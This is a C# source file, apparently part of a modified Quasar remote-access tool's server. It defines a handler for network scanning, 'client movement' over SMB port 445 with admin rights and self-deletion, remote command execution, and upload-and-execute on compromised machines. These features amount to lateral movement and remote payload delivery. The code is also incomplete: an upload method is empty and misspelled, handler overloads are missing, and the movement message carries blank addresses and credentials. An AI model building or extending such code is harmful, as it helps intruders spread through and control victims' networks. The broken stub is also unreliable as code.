using Quasar.Common.Enums;
using Quasar.Common.Messages;
using Quasar.Common.Messages.other;
using Quasar.Common.Models;
using Quasar.Common.Networking;
using Quasar.Server.Networking;
using Quasar.Server.Models;
using System.Windows.Forms;
using Quasar.Server.Forms;
using Quasar.Common.Messages.Network;
using System.Collections;

namespace Quasar.Server.Messages
{
    public class NetworkHandler : MessageProcessorBase<NetworkEntity[]>
    {


        private readonly Client _client;

        public NetworkHandler(Client client) : base(true)
        {
            _client = client;
        }

        public override bool CanExecute(IMessage message) => message is DoNetworkScanResponse ||
                                                             message is DoClientMovementResponse ||
                                                             message is DoRemoteCommandExecuteResponse ||
                                                             message is DoUploadAndExecuteResponse;

        public override bool CanExecuteFrom(ISender sender) => _client.Equals(sender);

        public override void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case DoNetworkScanResponse scanResp:
                    Execute(sender, scanResp);
                    break;
                case DoClientMovementResponse moveResp:
                    Execute(sender, moveResp);
                    break;
                case DoRemoteCommandExecuteResponse cmdResp:
                    Execute(sender, cmdResp);
                    break;
                case DoUploadAndExecuteResponse uploadResp:
                    Execute(sender, uploadResp);
                    break;
            }
        }

        public void RefreshEntities()
        {
            _client.Send(new DoNetworkScan());
        }

        public void MoveToEntity(NetworkEntity entity)
        {
            _client.Send(new DoClientMovement { Address = "", AsAdmin = true, DeleteAfter = true, MAC = "", Username = "", Password = "", Port = 445, Share = "" });
        }

        public void UploadAndExecte(NetworkEntity entity)
        {

        }
    }
}
